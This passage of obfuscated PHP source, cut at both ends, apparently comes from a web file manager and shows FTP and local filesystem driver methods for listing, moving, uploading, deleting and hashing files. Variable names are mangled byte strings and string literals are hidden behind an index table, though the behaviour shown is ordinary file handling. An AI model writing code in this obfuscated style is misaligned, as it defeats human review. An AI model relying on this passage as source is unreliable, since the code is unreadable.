$Ä×Ûô¾É); if (!$æËÒöª¦) { return !1; } } $Ã¶”Ìûˆ = $this->iconvSystem($Ã¶”Ìûˆ); return @ftp_rmdir($this->connect, $Ã¶”Ìûˆ); } public function rename($â¾ğß’®, $âùù“Û¨) { $ñ‹¢ß… =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->_isconn()) { return !1; } $î¥Øäßğ = $this->fileNameAuto($this->pathFather($â¾ğß’®), $âùù“Û¨); $î¥Øäßğ = $this->iconvSystem($î¥Øäßğ); $â¾ğß’® = $this->iconvSystem($â¾ğß’®); $õ¿øóµË = $this->pathFather($â¾ğß’®); $ıÖÀáÔ· = rtrim($õ¿øóµË, $ñ‹¢ß…[8]) . $ñ‹¢ß…[8] . $î¥Øäßğ; $¿â¸¿Ç¦ = @ftp_rename($this->connect, $â¾ğß’®, $ıÖÀáÔ·); $ıÖÀáÔ· = $this->iconvApp($ıÖÀáÔ·); return $¿â¸¿Ç¦ ? $this->getPathOuter($ıÖÀáÔ·) : !1; } private function folderInfo($áòÔ×¿î, $³á‰ğˆ = false) { $½Ÿ·ÕÍ× =& $_SERVER[¹ş¤¶ĞÖ]; $¦ìË›Ü = array($½Ÿ·ÕÍ×[32] => $this->pathThis($áòÔ×¿î), $½Ÿ·ÕÍ×[84] => $this->getPathOuter($½Ÿ·ÕÍ×[8] . $áòÔ×¿î), $½Ÿ·ÕÍ×[33] => $½Ÿ·ÕÍ×[75]); if ($³á‰ğˆ) { return $¦ìË›Ü; } $¦ìË›Ü[$½Ÿ·ÕÍ×[201]] = $¦ìË›Ü[$½Ÿ·ÕÍ×[85]] = 0; $¦ìË›Ü[$½Ÿ·ÕÍ×[202]] = $¦ìË›Ü[$½Ÿ·ÕÍ×[203]] = !0; return $¦ìË›Ü; } private function fileInfo($ÃõÁúÊ¿, $Ë•Ù¯…¥ = false, $öŒó‰¢ü = array()) { $Ÿ§‘–ñ =& $_SERVER[¹ş¤¶ĞÖ]; $É´ó—ğ = array($Ÿ§‘–ñ[32] => $this->pathThis($ÃõÁúÊ¿), $Ÿ§‘–ñ[84] => $this->getPathOuter($Ÿ§‘–ñ[8] . $ÃõÁúÊ¿), $Ÿ§‘–ñ[33] => $Ÿ§‘–ñ[200], $Ÿ§‘–ñ[76] => isset($öŒó‰¢ü[$Ÿ§‘–ñ[76]]) ? $öŒó‰¢ü[$Ÿ§‘–ñ[76]] : 0, $Ÿ§‘–ñ[174] => $this->ext($ÃõÁúÊ¿)); if ($Ë•Ù¯…¥) { return $É´ó—ğ; } $É´ó—ğ[$Ÿ§‘–ñ[201]] = $É´ó—ğ[$Ÿ§‘–ñ[85]] = 0; $É´ó—ğ[$Ÿ§‘–ñ[202]] = $É´ó—ğ[$Ÿ§‘–ñ[203]] = !0; $ìïË†å = $this->iconvSystem($ÃõÁúÊ¿); $É´ó—ğ[$Ÿ§‘–ñ[85]] = @ftp_mdtm($this->connect, $ìïË†å); if (empty($öŒó‰¢ü)) { $öŒó‰¢ü = $this->objectMeta($ÃõÁúÊ¿); if (!$öŒó‰¢ü) { return $É´ó—ğ; } } $É´ó—ğ[$Ÿ§‘–ñ[76]] = $öŒó‰¢ü[$Ÿ§‘–ñ[76]]; return $É´ó—ğ; } public function size($Ôõ®ó) { $Ğî±Š°† = $this->objectMeta($Ôõ®ó); return $Ğî±Š°† ? $Ğî±Š°†[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function info($¤¨°‰ŒÈ) { if ($this->isFile($¤¨°‰ŒÈ)) { return $this->fileInfo($¤¨°‰ŒÈ, 0); } else { if ($this->isFolder($¤¨°‰ŒÈ)) { return $this->folderInfo($¤¨°‰ŒÈ); } } return !1; } private function fileList($Ê«±×³², &$ÊÇáÚÇÃ, &$ìáÃêó, $†“Êºóô = false) { $Şª¬«À =& $_SERVER[¹ş¤¶ĞÖ]; $Ê«±×³² = $this->iconvSystem($Ê«±×³²); if (!$this->isFolder($Ê«±×³²)) { return !1; } @ftp_chdir($this->connect, $Şª¬«À[8]); $Ê«±×³² = rtrim($Ê«±×³², $Şª¬«À[8]) . $Şª¬«À[8]; check_abort(); $™ö¨¹¿¸ = @ftp_rawlist($this->connect, $Ê«±×³²); if (!$™ö¨¹¿¸) { $™ö¨¹¿¸ = array(); } $›Ø½Ëô = array($Şª¬«À[10] => 1, $Şª¬«À[1312] => 1); foreach ($™ö¨¹¿¸ as $õúø¾ï) { $¯ñİÏÃ = $this->_listItem($õúø¾ï); if ($¯ñİÏÃ[0] == $Şª¬«À[784]) { continue; } $˜Ğ‘Ÿ€ñ = $¯ñİÏÃ[8]; if (empty($˜Ğ‘Ÿ€ñ) && $˜Ğ‘Ÿ€ñ !== $Şª¬«À[198] || isset($›Ø½Ëô[$˜Ğ‘Ÿ€ñ])) { continue; } $˜Ğ‘Ÿ€ñ = $this->iconvApp($Ê«±×³² . ltrim($˜Ğ‘Ÿ€ñ, $Şª¬«À[8])); $¥¾ÑŒÄæ = array($Şª¬«À[32] => $˜Ğ‘Ÿ€ñ, $Şª¬«À[33] => $Şª¬«À[200], $Şª¬«À[76] => $¯ñİÏÃ[4]); if (substr($õúø¾ï, 0, 1) == $Şª¬«À[1394]) { $¥¾ÑŒÄæ[$Şª¬«À[33]] = $Şª¬«À[75]; $¥¾ÑŒÄæ[$Şª¬«À[76]] = 0; } $–°Øñœ¥ = $¥¾ÑŒÄæ[$Şª¬«À[33]] == $Şª¬«À[75] ? !0 : !1; $this->cacheMethodInfoSet($˜Ğ‘Ÿ€ñ, $–°Øñœ¥, $¥¾ÑŒÄæ); if ($–°Øñœ¥) { $ÊÇáÚÇÃ[] = $˜Ğ‘Ÿ€ñ; if ($†“Êºóô) { $this->fileList($˜Ğ‘Ÿ€ñ, $ÊÇáÚÇÃ, $ìáÃêó, $†“Êºóô); } continue; } $ìáÃêó[] = $¥¾ÑŒÄæ; } $this->cacheMethodInfoSet($Ê«±×³², !0); } private function _listItem($ ³—ç´–) { if (empty($ ³—ç´–)) { return array(); } $¼ÓÕ¤– = preg_split($_SERVER[¹ş¤¶ĞÖ][1395], $ ³—ç´–); if (count($¼ÓÕ¤–) <= 9) { return $¼ÓÕ¤–; } $¼ÓÕ¤–[8] = trim(substr($ ³—ç´–, strpos($ ³—ç´–, $¼ÓÕ¤–[7]) + strlen($¼ÓÕ¤–[7]))); return array_splice($¼ÓÕ¤–, 0, 9); } public function listPath($äíÔ×à˜, $ÇÅôÁæ = false) { $×ñì¾íÄ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->_isconn()) { return !1; } $Ã‘üü½ú = $ç¥Ô­Ô“ = array(); $this->fileList($äíÔ×à˜, $Ã‘üü½ú, $ç¥Ô­Ô“); foreach ($Ã‘üü½ú as $²Œ•£ö => $Ë„‹òƒÓ) { $Ã‘üü½ú[$²Œ•£ö] = $this->folderInfo($Ë„‹òƒÓ, $ÇÅôÁæ); } foreach ($ç¥Ô­Ô“ as $²Œ•£ö => $Ë„‹òƒÓ) { $ç¥Ô­Ô“[$²Œ•£ö] = $this->fileInfo($Ë„‹òƒÓ[$×ñì¾íÄ[32]], $ÇÅôÁæ, $Ë„‹òƒÓ); } return array($×ñì¾íÄ[82] => $Ã‘üü½ú, $×ñì¾íÄ[83] => $ç¥Ô­Ô“); } public function has($ƒÚö•”›, $à¯ñí¸˜ = false, $…öğÓ§ = true) { $„ªŒêÓ† =& $_SERVER[¹ş¤¶ĞÖ]; $¢ºÊ™’² = $î¼Ä•³¦ = array(); $•Ë½›©í = $à¯ñí¸˜ ? !0 : !1; $this->fileList($ƒÚö•”›, $¢ºÊ™’², $î¼Ä•³¦, $•Ë½›©í); if ($à¯ñí¸˜) { return array($„ªŒêÓ†[207] => count($î¼Ä•³¦), $„ªŒêÓ†[208] => count($¢ºÊ™’²)); } if ($…öğÓ§) { if (count($î¼Ä•³¦)) { return !0; } } else { if (count($¢ºÊ™’²)) { return !0; } } return !1; } public function listAll($ˆª¯ìèğ) { $—É¹“Õ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->_isconn()) { return !1; } $âÇ¬å¿ = $ˆ¼ŞöÛ = array(); $this->fileList($ˆª¯ìèğ, $âÇ¬å¿, $ˆ¼ŞöÛ, !0); $»İ†¯Ïû = array_to_keyvalue($ˆ¼ŞöÛ, $—É¹“Õ[32]); foreach ($âÇ¬å¿ as $§¤ê‚ó¨) { if (is_string($§¤ê‚ó¨)) { $»İ†¯Ïû[$§¤ê‚ó¨] = array($—É¹“Õ[76] => 0); } } return $this->listAllFiles($ˆª¯ìèğ, $»İ†¯Ïû); } public function getContent($òåŞ¤ü·) { if (!$this->_isconn()) { return !1; } $òåŞ¤ü· = $this->iconvSystem($òåŞ¤ü·); return $this->fileSubstr($òåŞ¤ü·); } public function setContent($±í³îÃ‘, $•Êé×ú‘ = '') { if (!$this->_isconn()) { return !1; } $Ÿ“ÇÒÚ = $this->pathThis($this->iconvSystem($±í³îÃ‘)); $¨¼Ê™Ø = $this->tempFile($Ÿ“ÇÒÚ); file_put_contents($¨¼Ê™Ø, $•Êé×ú‘); $«Ú†ÓàË = $this->upload($±í³îÃ‘, $this->iconvApp($¨¼Ê™Ø)); $this->tempFileRemve($¨¼Ê™Ø); return $«Ú†ÓàË; } public function fileSubstr($û¦Œ¢ï³, $Ÿ ÖéÇ = 0, $Ã¾ş•¥® = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($û¦Œ¢ï³, $Ÿ ÖéÇ, $Ã¾ş•¥®); } private function ftpRequest($€¥œÃ‚Ü, $‡©ßŠ¼ø = 0, $¡º®±ø = false) { $€¥œÃ‚Ü = $this->iconvSystem($€¥œÃ‚Ü); $ûÏöşÎ» = $this->scheme . $this->host . $_SERVER[¹ş¤¶ĞÖ][4] . $this->port; $¿Úı‡ïŸ = curl_init(); curl_setopt($¿Úı‡ïŸ, CURLOPT_URL, $ûÏöşÎ» . $this->pathEncode($€¥œÃ‚Ü)); curl_setopt($¿Úı‡ïŸ, CURLOPT_USERPWD, "{$this->username}\72{$this->userpass}"); if ($¡º®±ø) { $ØÒÌµíˆ = $‡©ßŠ¼ø + $¡º®±ø - 1; curl_setopt($¿Úı‡ïŸ, CURLOPT_RANGE, "{$‡©ßŠ¼ø}\55{$ØÒÌµíˆ}"); } curl_setopt($¿Úı‡ïŸ, CURLOPT_RETURNTRANSFER, 1); $ÑØ¦ò† = curl_exec($¿Úı‡ïŸ); curl_close($¿Úı‡ïŸ); return $ÑØ¦ò†; } public function upload($Œó¤û¥, $—Ô—ìÛÏ, $Ô‚©À¥¬ = false, $¿óÕüµ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($Œó¤û¥))) { return !1; } $Œó¤û¥ = $this->iconvSystem($Œó¤û¥); $—Ô—ìÛÏ = $this->iconvSystem($—Ô—ìÛÏ); $Ã²ñì¦õ = ftp_nb_put($this->connect, $Œó¤û¥, $—Ô—ìÛÏ, FTP_BINARY); while ($Ã²ñì¦õ == FTP_MOREDATA) { $Ã²ñì¦õ = ftp_nb_continue($this->connect); } if ($Ã²ñì¦õ != FTP_FINISHED) { return !1; } return $this->getPathOuter($Œó¤û¥); } public function download($úÉÉ”ì‹, $şó¾é½× = '') { if (!$this->_isconn()) { return !1; } $ôÁœ»ÙÙ = $this->pathFather($şó¾é½×); if (!IO::mkdir($ôÁœ»ÙÙ)) { return !1; } $úÉÉ”ì‹ = $this->iconvSystem($úÉÉ”ì‹); $şó¾é½× = $this->iconvSystem($şó¾é½×); $´ÔŸ‰ö„ = ftp_nb_get($this->connect, $şó¾é½×, $úÉÉ”ì‹, FTP_BINARY); while ($´ÔŸ‰ö„ == FTP_MOREDATA) { $´ÔŸ‰ö„ = ftp_nb_continue($this->connect); } if ($´ÔŸ‰ö„ != FTP_FINISHED) { return !1; } return $this->iconvApp($şó¾é½×); } public function exist($äçòïÕ) { return $this->isFile($äçòïÕ) || $this->isFolder($äçòïÕ); } public function isFile($Û¾ÆŒ‘ƒ) { return !$this->isFolder($Û¾ÆŒ‘ƒ) && $this->objectMeta($Û¾ÆŒ‘ƒ); } public function isFolder($©ˆÎ²óù) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][165], $©ˆÎ²óù); } protected function objectMeta($ø¹é…°Ø) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][167], $ø¹é…°Ø); } protected function _objectMeta($‚´˜ÔÇ) { $Ÿ¿â¢Èß =& $_SERVER[¹ş¤¶ĞÖ]; if ($‚´˜ÔÇ == $Ÿ¿â¢Èß[12] || $‚´˜ÔÇ == $Ÿ¿â¢Èß[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‚´˜ÔÇ = $this->iconvSystem($‚´˜ÔÇ); $À÷ñúŠç = array($Ÿ¿â¢Èß[32] => $this->iconvApp($‚´˜ÔÇ), $Ÿ¿â¢Èß[33] => $Ÿ¿â¢Èß[200], $Ÿ¿â¢Èß[76] => 0); @ftp_chdir($this->connect, $Ÿ¿â¢Èß[8]); $¾Âôùü¼ = @ftp_size($this->connect, $‚´˜ÔÇ); if ($¾Âôùü¼ != -1) { $À÷ñúŠç[$Ÿ¿â¢Èß[76]] = $¾Âôùü¼; } else { $Ÿ÷¼¹Ğö = @ftp_chdir($this->connect, $‚´˜ÔÇ); if (!$Ÿ÷¼¹Ğö) { return !1; } $À÷ñúŠç[$Ÿ¿â¢Èß[33]] = $Ÿ¿â¢Èß[75]; } return $À÷ñúŠç; } protected function _isFolder($ª£íÑê) { $Ş· ü˜ó =& $_SERVER[¹ş¤¶ĞÖ]; if ($ª£íÑê == $Ş· ü˜ó[12] || $ª£íÑê == $Ş· ü˜ó[8]) { return !0; } $åòéì÷‰ = $this->_objectMeta($ª£íÑê); return isset($åòéì÷‰[$Ş· ü˜ó[33]]) && $åòéì÷‰[$Ş· ü˜ó[33]] == $Ş· ü˜ó[75] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($õĞª¨â) { if (substr($õĞª¨â, 0, 2) == $_SERVER[¹ş¤¶ĞÖ][1311]) { $õĞª¨â = BASIC_PATH . substr($õĞª¨â, 2); } return $õĞª¨â; } public function iconvApp($ÕŠœ³¡İ) { $ùÔÚÄáß =& $_SERVER[¹ş¤¶ĞÖ]; global $config; return $this->iconvTo($ÕŠœ³¡İ, $config[$ùÔÚÄáß[1386]], $config[$ùÔÚÄáß[1385]]); } public function iconvSystem($ø¼¶êë) { $öè­‰” =& $_SERVER[¹ş¤¶ĞÖ]; global $config; return $this->iconvTo($ø¼¶êë, $config[$öè­‰”[1385]], $config[$öè­‰”[1386]]); } public function getPathOuter($ß¥©¯åï) { $ğ ò—²ˆ =& $_SERVER[¹ş¤¶ĞÖ]; $îŞÎØ  = $this->iconvApp($this->pathBase); $ß¥©¯åï = $this->iconvApp($ß¥©¯åï); if (substr($îŞÎØ , 0, 2) == $ğ ò—²ˆ[1311]) { $îŞÎØ  = BASIC_PATH . substr($îŞÎØ , 2); } if (substr($ß¥©¯åï, 0, 2) == $ğ ò—²ˆ[1311]) { $ß¥©¯åï = BASIC_PATH . substr($ß¥©¯åï, 2); } $îŞÎØ  = KodIO::clear($îŞÎØ ); $ß¥©¯åï = KodIO::clear($ß¥©¯åï); $ß¥©¯åï = substr($ß¥©¯åï, strlen($îŞÎØ )); if (empty($this->pathDriver)) { return $ß¥©¯åï; } return $this->pathDriver . $ğ ò—²ˆ[8] . ltrim($ß¥©¯åï, $ğ ò—²ˆ[8]); } public function mkfile($÷‹ú¦á›, $£ÆæúÒ = '', $ßØƒ€˜´ = REPEAT_RENAME) { $÷‹ú¦á› = $this->iconvSystem($÷‹ú¦á›); @touch($÷‹ú¦á›); if ($£ÆæúÒ) { file_put_contents($÷‹ú¦á›, $£ÆæúÒ); } @chmod($÷‹ú¦á›, $this->pathAuth); return is_file($÷‹ú¦á›) ? $this->getPathOuter($÷‹ú¦á›) : !1; } public function mkdir($™À–€Æ», $¤½Œ…×… = REPEAT_SKIP) { $™À–€Æ» = $this->iconvSystem($™À–€Æ»); if (is_dir($™À–€Æ»)) { return $this->getPathOuter($™À–€Æ»); } @mkdir($™À–€Æ», $this->pathAuth, !0); @chmod($™À–€Æ», $this->pathAuth); return is_dir($™À–€Æ») ? $this->getPathOuter($™À–€Æ») : !1; } public function copyFile($Ô¦µ¯¡î, $Š»êÊâ) { $this->mkdir($this->pathFather($Š»êÊâ)); $Ô¦µ¯¡î = $this->iconvSystem($Ô¦µ¯¡î); $Š»êÊâ = $this->iconvSystem($Š»êÊâ); $˜”ªôĞ = copy_64($Ô¦µ¯¡î, $Š»êÊâ); @chmod($Š»êÊâ, $this->pathAuth); return $˜”ªôĞ ? $this->getPathOuter($Š»êÊâ) : !1; } public function moveFile($Şšƒµ¶Ó, $ÀŠà’ ø) { $this->mkdir($this->pathFather($ÀŠà’ ø)); $Şšƒµ¶Ó = $this->iconvSystem($Şšƒµ¶Ó); $ÀŠà’ ø = $this->iconvSystem($ÀŠà’ ø); $”ßõ¶–„ = intval(@rename($Şšƒµ¶Ó, $ÀŠà’ ø)); if (!$”ßõ¶–„) { if ($”ßõ¶–„ = intval(@copy_64($Şšƒµ¶Ó, $ÀŠà’ ø))) { @unlink($Şšƒµ¶Ó); } } @chmod($ÀŠà’ ø, $this->pathAuth); return $”ßõ¶–„ ? $this->getPathOuter($ÀŠà’ ø) : !1; } public function movePath($ÃÆ÷öÖì, $şêŞ•¿º, $Î°Ä¿Ç = false) { $‡‘òĞş¨ =& $_SERVER[¹ş¤¶ĞÖ]; $ÃÆ÷öÖì = $this->iconvSystem($ÃÆ÷öÖì); $şêŞ•¿º = $this->iconvSystem($şêŞ•¿º); $…›”«ù¡ = rtrim($şêŞ•¿º, $‡‘òĞş¨[8]) . $‡‘òĞş¨[8] . ($Î°Ä¿Ç ? $Î°Ä¿Ç : get_path_this($ÃÆ÷öÖì)); if (file_exists($…›”«ù¡)) { return !1; } $Í‰†ÕÓÆ = intval(@rename($ÃÆ÷öÖì, $…›”«ù¡)); $Í‰†ÕÓÆ = file_exists($…›”«ù¡); return $Í‰†ÕÓÆ ? $this->getPathOuter($…›”«ù¡) : !1; } public function delFile($ ç“öÎ) { $ ç“öÎ = $this->iconvSystem($ ç“öÎ); if (!@unlink($ ç“öÎ)) { @chmod($ ç“öÎ, $this->pathAuth); if (!@unlink($ ç“öÎ)) { return !1; } } else { return !0; } } public function delFolder($ˆ‹ÔÔ¸Œ) { $“ÚóØ™ş =& $_SERVER[¹ş¤¶ĞÖ]; $ˆ‹ÔÔ¸Œ = $this->iconvSystem($ˆ‹ÔÔ¸Œ); if (!is_dir($ˆ‹ÔÔ¸Œ)) { return !0; } if (!($ ‹Ô„‚® = opendir($ˆ‹ÔÔ¸Œ))) { return !1; } while (($áÚ¨ÚŸ = readdir($ ‹Ô„‚®)) !== !1) { if ($áÚ¨ÚŸ == $“ÚóØ™ş[10] || $áÚ¨ÚŸ == $“ÚóØ™ş[1312]) { continue; } $Â—øí«® = $ˆ‹ÔÔ¸Œ . $“ÚóØ™ş[8] . $áÚ¨ÚŸ; if (is_file($Â—øí«®) || is_link($Â—øí«®)) { if (!unlink($Â—øí«®)) { chmod($Â—øí«®, $this->pathAuth); if (!unlink($Â—øí«®)) { return !1; } } } else { if (is_dir($Â—øí«®)) { chmod($Â—øí«®, $this->pathAuth); $Â—øí«® = $this->iconvApp($Â—øí«®); if (!$this->delFolder($Â—øí«®)) { return !1; } } } } closedir($ ‹Ô„‚®); return rmdir($ˆ‹ÔÔ¸Œ); } public function rename($‚‰±‰»æ, $©„éÓèÙ) { $Ô¹÷òóÓ =& $_SERVER[¹ş¤¶ĞÖ]; $ë¯‡ï¾ = $this->fileNameAuto($this->pathFather($‚‰±‰»æ), $©„éÓèÙ); $ë¯‡ï¾ = $this->iconvSystem($ë¯‡ï¾); $‚‰±‰»æ = $this->iconvSystem($‚‰±‰»æ); $ûÈã†®ê = $this->pathFather($‚‰±‰»æ); $ô×Ù„½î = rtrim($ûÈã†®ê, $Ô¹÷òóÓ[8]) . $Ô¹÷òóÓ[8] . $ë¯‡ï¾; $·Ò …†² = @rename($‚‰±‰»æ, $ô×Ù„½î); $ô×Ù„½î = $this->iconvApp($ô×Ù„½î); return $·Ò …†² ? $this->getPathOuter($ô×Ù„½î) : !1; } public function size($§š¥šÇ“) { $§š¥šÇ“ = $this->iconvSystem($§š¥šÇ“); return filesize_64($§š¥šÇ“); } public function info($„Ÿıîè¬) { $„Ÿıîè¬ = $this->iconvSystem($„Ÿıîè¬); if ($this->isFolder($„Ÿıîè¬)) { return $this->folderInfo($„Ÿıîè¬); } else { if ($this->isFile($„Ÿıîè¬)) { return $this->fileInfo($„Ÿıîè¬); } } return !1; } protected function infoChildren($Ş©î’…È, &$Ê­û™ŠË, $¸ĞŞº©Ò = true) { $ÌâêÈ·Û =& $_SERVER[¹ş¤¶ĞÖ]; check_abort_echo(); $Ş©î’…È = rtrim($Ş©î’…È, $ÌâêÈ·Û[8]) . $ÌâêÈ·Û[8]; if ($¸ĞŞº©Ò) { $Ş©î’…È = $this->iconvSystem($Ş©î’…È); } if (!($‚íŸ–¨ = @opendir($Ş©î’…È))) { return; } while (($ ùš¾óÃ = readdir($‚íŸ–¨)) !== !1) { if ($ ùš¾óÃ == $ÌâêÈ·Û[10] || $ ùš¾óÃ == $ÌâêÈ·Û[1312]) { continue; } $’ìá¶Áù = $Ş©î’…È . $ ùš¾óÃ; if (is_file($’ìá¶Áù) || is_link($’ìá¶Áù)) { $Ê­û™ŠË[$ÌâêÈ·Û[77]]++; $Ê­û™ŠË[$ÌâêÈ·Û[76]] += filesize_64($’ìá¶Áù); } else { if (is_dir($’ìá¶Áù)) { $Ê­û™ŠË[$ÌâêÈ·Û[78]]++; $this->infoChildren($’ìá¶Áù, $Ê­û™ŠË, !1); } } } closedir($‚íŸ–¨); } private function folderInfo($÷Üº•Ş, $ØÀñ¶ıÂ = false) { $Èôä™ğÌ =& $_SERVER[¹ş¤¶ĞÖ]; $÷Üº•Ş = rtrim($÷Üº•Ş, $Èôä™ğÌ[8]) . $Èôä™ğÌ[8]; $•åá¿Åó = $this->iconvApp($this->pathThis($÷Üº•Ş)); if ($ØÀñ¶ıÂ) { return array($Èôä™ğÌ[32] => $•åá¿Åó, $Èôä™ğÌ[84] => $this->getPathOuter($÷Üº•Ş), $Èôä™ğÌ[33] => $Èôä™ğÌ[75]); } $ñ¦³«òØ = array($Èôä™ğÌ[32] => $•åá¿Åó, $Èôä™ğÌ[84] => $this->getPathOuter($÷Üº•Ş), $Èôä™ğÌ[33] => $Èôä™ğÌ[75], $Èôä™ğÌ[201] => @filectime($÷Üº•Ş), $Èôä™ğÌ[85] => @filemtime($÷Üº•Ş), $Èôä™ğÌ[1396] => @fileatime($÷Üº•Ş), $Èôä™ğÌ[1397] => is_readable($÷Üº•Ş), $Èôä™ğÌ[1398] => is_writable($÷Üº•Ş), $Èôä™ğÌ[1399] => get_mode($÷Üº•Ş)); return $ñ¦³«òØ; } private function fileInfo($§È“¤…¿, $ÑıÀ¹«€ = false) { $ƒáô×øå =& $_SERVER[¹ş¤¶ĞÖ]; $Íí¯¤îü = $this->iconvApp($this->pathThis($§È“¤…¿)); if ($ÑıÀ¹«€) { return array($ƒáô×øå[32] => $Íí¯¤îü, $ƒáô×øå[84] => $this->getPathOuter($§È“¤…¿), $ƒáô×øå[33] => $ƒáô×øå[200], $ƒáô×øå[76] => $this->size($§È“¤…¿), $ƒáô×øå[174] => $this->ext($Íí¯¤îü)); } $Ÿèáá = array($ƒáô×øå[32] => $Íí¯¤îü, $ƒáô×øå[84] => $this->getPathOuter($§È“¤…¿), $ƒáô×øå[33] => $ƒáô×øå[200], $ƒáô×øå[201] => @filectime($§È“¤…¿), $ƒáô×øå[85] => @filemtime($§È“¤…¿), $ƒáô×øå[1396] => @fileatime($§È“¤…¿), $ƒáô×øå[76] => $this->size($§È“¤…¿), $ƒáô×øå[174] => $this->ext($Íí¯¤îü), $ƒáô×øå[1397] => is_readable($§È“¤…¿), $ƒáô×øå[1398] => is_writable($§È“¤…¿), $ƒáô×øå[1399] => get_mode($§È“¤…¿)); return $Ÿèáá; } public function exist($ù§’“àÅ) { $ù§’“àÅ = $this->iconvSystem($ù§’“àÅ); return @file_exists($ù§’“àÅ); } public function isFile($‚™˜ã§ª) { $‚™˜ã§ª = $this->iconvSystem($‚™˜ã§ª); return @is_file($‚™˜ã§ª); } public function isFolder($’Œƒ‚ïÅ) { $’Œƒ‚ïÅ = $this->iconvSystem($’Œƒ‚ïÅ); return @is_dir($’Œƒ‚ïÅ); } public function listPath($Î‹ßã§¼, $ÃÎàû‚´ = false) { $Ÿ¾ßØÊ­ =& $_SERVER[¹ş¤¶ĞÖ]; $Î‹ßã§¼ = $this->iconvSystem($Î‹ßã§¼); $Î‹ßã§¼ = rtrim($Î‹ßã§¼, $Ÿ¾ßØÊ­[8]) . $Ÿ¾ßØÊ­[8]; $àÄ³âŞÇ = array($Ÿ¾ßØÊ­[82] => array(), $Ÿ¾ßØÊ­[83] => array()); if (!($œª«¾— = @opendir($Î‹ßã§¼))) { return $àÄ³âŞÇ; } while (($´ÛıøĞŠ = readdir($œª«¾—)) !== !1) { if ($´ÛıøĞŠ == $Ÿ¾ßØÊ­[10] || $´ÛıøĞŠ == $Ÿ¾ßØÊ­[1312]) { continue; } $”ßÁîŠ‰ = $Î‹ßã§¼ . $´ÛıøĞŠ; if (is_file($”ßÁîŠ‰)) { $àÄ³âŞÇ[$Ÿ¾ßØÊ­[83]][] = $this->fileInfo($”ßÁîŠ‰, $ÃÎàû‚´); } else { $àÄ³âŞÇ[$Ÿ¾ßØÊ­[82]][] = $this->folderInfo($”ßÁîŠ‰, $ÃÎàû‚´); } } closedir($œª«¾—); return $àÄ³âŞÇ; } public function listAll($ëÉ©Ğ û, &$¡‚ÉüÊ„ = array()) { $ï¼ÄÕÀÒ =& $_SERVER[¹ş¤¶ĞÖ]; $ëÉ©Ğ û = $this->iconvSystem($ëÉ©Ğ û); $ëÉ©Ğ û = rtrim($ëÉ©Ğ û, $ï¼ÄÕÀÒ[8]) . $ï¼ÄÕÀÒ[8]; if (!($Û¶ªº›© = @opendir($ëÉ©Ğ û))) { return $¡‚ÉüÊ„; } while (($ïé·çåÂ = readdir($Û¶ªº›©)) !== !1) { if ($ïé·çåÂ == $ï¼ÄÕÀÒ[10] || $ïé·çåÂ == $ï¼ÄÕÀÒ[1312]) { continue; } $¼õÉÜÆä = $ëÉ©Ğ û . $ïé·çåÂ; $Ä¤üğØ¸ = is_dir($¼õÉÜÆä) && !is_link($¼õÉÜÆä) ? 1 : 0; $¼õÉÜÆä = $Ä¤üğØ¸ ? $¼õÉÜÆä . $ï¼ÄÕÀÒ[8] : $¼õÉÜÆä; $¡‚ÉüÊ„[] = array($ï¼ÄÕÀÒ[84] => $¼õÉÜÆä, $ï¼ÄÕÀÒ[75] => $Ä¤üğØ¸, $ï¼ÄÕÀÒ[85] => intval(@filemtime($¼õÉÜÆä)), $ï¼ÄÕÀÒ[76] => $Ä¤üğØ¸ ? 0 : intval($this->size($¼õÉÜÆä))); if ($Ä¤üğØ¸) { $this->listAll($¼õÉÜÆä, $¡‚ÉüÊ„); } } closedir($Û¶ªº›©); return $¡‚ÉüÊ„; } public function has($•¶Ê×Ê, $ªæ—´¬— = false, $ºÒø£ºï = true) { $‚¾âàï =& $_SERVER[¹ş¤¶ĞÖ]; $•¶Ê×Ê = $this->iconvSystem($•¶Ê×Ê); $•¶Ê×Ê = rtrim($•¶Ê×Ê, $‚¾âàï[8]) . $‚¾âàï[8]; if (!($ÑùÄÉ®÷ = @opendir($•¶Ê×Ê))) { return !1; } $íŒİğĞÇ = 0; $•™×‚‘´ = 0; $ƒÆ…Â¬ = 0; while (($Ñ—„šü = readdir($ÑùÄÉ®÷)) !== !1) { if ($Ñ—„šü == $‚¾âàï[10] || $Ñ—„šü == $‚¾âàï[1312]) { continue; } $îØ˜æöá = $•¶Ê×Ê . $Ñ—„šü; if ($ªæ—´¬—) { $ƒÆ…Â¬++; if (@is_file($îØ˜æöá)) { $íŒİğĞÇ++; } else { $•™×‚‘´++; } if ($ƒÆ…Â¬ > 10000) { break; } continue; } if ($ºÒø£ºï) { if (@is_file($îØ˜æöá)) { return !0; } } else { if (@is_dir($îØ˜æöá . $‚¾âàï[8])) { return !0; } } } closedir($ÑùÄÉ®÷); if ($ªæ—´¬—) { return array($‚¾âàï[207] => $íŒİğĞÇ, $‚¾âàï[208] => $•™×‚‘´); } return !1; } public function hashSimple($ä¹ÅĞõ³) { $Ó×Èó¿ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$ä¹ÅĞõ³) { return md5($Ó×Èó¿[12]); } $ä¹ÅĞõ³ = $this->iconvSystem($ä¹ÅĞõ³); $¿×ıû¤Ù = $this->size($ä¹ÅĞõ³); $œÈŒ°µ = 200; $—õƒ©“Ì = 50; if ($¿×ıû¤Ù <= $œÈŒ°µ * $—õƒ©“Ì) { return $this->hashMd5($ä¹ÅĞõ³) . $¿×ıû¤Ù; } $Şã‡•Å¢ = $Ó×Èó¿[12]; $Úü¨óõ· = intval($¿×ıû¤Ù / $—õƒ©“Ì); $œÆŠÄ³ = fopen($ä¹ÅĞõ³, $Ó×Èó¿[1400]); if (!$œÆŠÄ³) { return $Şã‡•Å¢; } for ($ûõçÙÁÏ = 0; $ûõçÙÁÏ < $—õƒ©“Ì; $ûõçÙÁÏ++) { fseek_64($œÆŠÄ³, $Úü¨óõ· * $ûõçÙÁÏ); $Şã‡•Å¢ .= 